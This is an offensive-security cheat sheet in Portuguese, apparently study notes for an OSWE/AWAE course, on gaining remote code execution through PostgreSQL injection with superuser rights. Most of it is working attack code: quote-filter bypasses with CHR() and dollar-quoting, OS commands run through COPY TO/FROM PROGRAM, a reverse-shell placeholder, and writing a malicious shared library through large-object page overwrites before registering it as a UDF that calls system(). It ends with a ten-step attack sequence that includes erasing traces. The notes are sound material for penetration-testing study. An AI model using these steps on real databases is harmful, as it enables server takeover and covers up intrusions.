---
title: "PostgreSQL RCE"
---

# PostgreSQL — RCE via Large Objects e UDF

> AWAE Ch.5 — técnicas avançadas para execução de código OS a partir de injeção SQL em PostgreSQL com privilégio de superuser.

---

## Verificação de Privilégios

```sql
-- verificar superuser
SELECT usename, usesuper, pg_read_server_files, pg_write_server_files
FROM pg_user
WHERE usename = current_user;
```

Condição necessária para COPY TO PROGRAM e Large Objects: `usesuper = true` ou `pg_read_server_files/pg_write_server_files`.

---

## CHR() Bypass de Aspas Simples

Quando o app filtra aspas simples, usar `CHR(n)` para construir strings via concatenação:

```sql
-- equivale a 'admin'
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);

-- em injeção: WHERE username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

---

## Dollar-Quoting

Alternativa a aspas simples — PostgreSQL aceita `$$string$$` ou `$TAG$string$TAG$`:

```sql
-- equivale a 'payload'
SELECT $$payload$$;
SELECT $tag$payload with 'quotes' inside$tag$;

-- útil em funções:
CREATE FUNCTION run_os(text) RETURNS text AS $$
  SELECT ...
$$ LANGUAGE sql;
```

---

## COPY TO/FROM PROGRAM

Executa comandos OS diretamente (requer superuser):

```sql
-- ler arquivo do sistema via programa
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
SELECT pg_read_file('/tmp/out.txt');

-- capturar output via tabela temporária
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
DROP TABLE cmd_output;

-- reverse shell: COPY (SELECT '') TO PROGRAM 'PAYLOAD_AQUI'
-- payload: netcat, bash tcp redirect, python socket, etc.
```

---

## Large Objects — Técnica Principal (AWAE Ch.5)

Permite escrever arquivos arbitrários no servidor contornando restrições de escrita direta.

### Conceito

PostgreSQL armazena "large objects" na tabela interna `pg_largeobject` em páginas de **2048 bytes** cada. É possível:
1. Criar um objeto vazio (importando arquivo dummy)
2. Sobrescrever suas páginas com conteúdo hex arbitrário
3. Exportar o objeto como arquivo no filesystem

### Passo 1 — Criar Large Object

```sql
-- importar arquivo existente para obter loid
SELECT lo_import('/etc/passwd');
-- retorna: loid (integer)

-- ou criar vazio
SELECT lo_create(0);

-- inspecionar páginas do objeto
SELECT loid, pageno, encode(data, 'hex') FROM pg_largeobject WHERE loid = LOID;
```

### Passo 2 — Calcular Hex do Payload

No Kali, converter o binário malicioso (DLL, shared library) para hex:

```bash
xxd -p malicious.dll | tr -d '\n'
# output: string hex contínua

# dividir em chunks de 4096 chars (= 2048 bytes = 1 página)
# página 0: chars 0–4095
# página 1: chars 4096–8191
```

### Passo 3 — Sobrescrever Páginas

```sql
-- sobrescrever página 0 (primeiros 2048 bytes)
UPDATE pg_largeobject
SET data = decode('HEXSTRING_PAGINA_0', 'hex')
WHERE loid = LOID AND pageno = 0;

-- inserir página 1 se necessário
INSERT INTO pg_largeobject (loid, pageno, data)
VALUES (LOID, 1, decode('HEXSTRING_PAGINA_1', 'hex'));
```

### Passo 4 — Exportar para Filesystem

```sql
-- exportar como DLL (caminho onde PostgreSQL tem permissão de escrita)
SELECT lo_export(LOID, '/tmp/malicious.so');

-- Windows: exportar para dir de libs PostgreSQL
SELECT lo_export(LOID, 'C:\\Program Files\\PostgreSQL\\12\\lib\\malicious.dll');
```

### Passo 5 — Limpeza

```sql
SELECT lo_unlink(LOID);
```

---

## UDF via C DLL — Execução de Comandos

Após exportar a DLL, registrar como função C no PostgreSQL.

### Estrutura da DLL

DLL PostgreSQL em C chama `system()` para executar comandos OS. A estrutura mínima inclui os headers do PostgreSQL (`postgres.h`, `fmgr.h`), a macro `PG_MODULE_MAGIC` obrigatória para compatibilidade com o loader, e a declaração da função via `PG_FUNCTION_INFO_V1(nome_funcao)`. A implementação recebe o argumento texto via `PG_GETARG_TEXT_PP(0)`, converte para C string com `text_to_cstring()`, e repassa para `system()`.

```bash
# compilar no Linux (ajustar versão PostgreSQL)
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_runcmd.so pg_runcmd.c
```

### Registrar e Usar

```sql
-- registrar UDF apontando para shared lib exportada
CREATE OR REPLACE FUNCTION pg_runcmd(text)
RETURNS text
AS '/tmp/pg_runcmd.so', 'pg_runcmd'
LANGUAGE C STRICT;

-- executar comando
SELECT pg_runcmd('id');
SELECT pg_runcmd('whoami');

-- limpar
DROP FUNCTION pg_runcmd(text);
```

---

## Fluxo Completo — Resumo

```
1. Verificar superuser → pg_user
2. Encontrar path gravável → /tmp ou dir do PostgreSQL
3. Preparar shared lib compilada para a plataforma alvo
4. Converter binário para hex: xxd -p lib.so | tr -d '\n'
5. lo_import('/etc/passwd') → obter loid
6. UPDATE/INSERT pg_largeobject → injetar hex por página (2048 bytes cada)
7. lo_export(loid, '/path/pg_runcmd.so') → gravar arquivo
8. CREATE OR REPLACE FUNCTION → registrar UDF
9. SELECT pg_runcmd('comando') → RCE
10. DROP FUNCTION + lo_unlink → limpar rastros
```

---

## Referências de Funções

| Função | Uso |
|--------|-----|
| `lo_import(path)` | Importar arquivo existente, retorna loid |
| `lo_export(loid, path)` | Exportar large object para arquivo |
| `lo_create(loid)` | Criar objeto com loid específico (0 = auto) |
| `lo_unlink(loid)` | Deletar large object |
| `pg_read_file(path)` | Ler arquivo texto (requer pg_read_server_files) |
| `COPY ... FROM PROGRAM` | Executar comando OS e capturar output |
| `COPY ... TO PROGRAM` | Executar comando OS com dados como stdin |
